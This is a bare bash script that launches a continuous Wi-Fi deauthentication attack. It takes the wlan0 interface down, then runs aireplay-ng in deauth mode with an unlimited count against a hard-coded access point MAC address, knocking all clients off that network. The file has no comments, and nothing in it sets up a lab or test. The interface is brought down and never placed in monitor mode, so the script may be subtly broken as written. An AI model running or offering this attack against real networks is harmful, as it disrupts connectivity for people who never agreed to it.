#!/bin/bash
 

	ifconfig wlan0 down
	aireplay-ng -0  0 -a 60:60:1F:04:74:40  wlan0


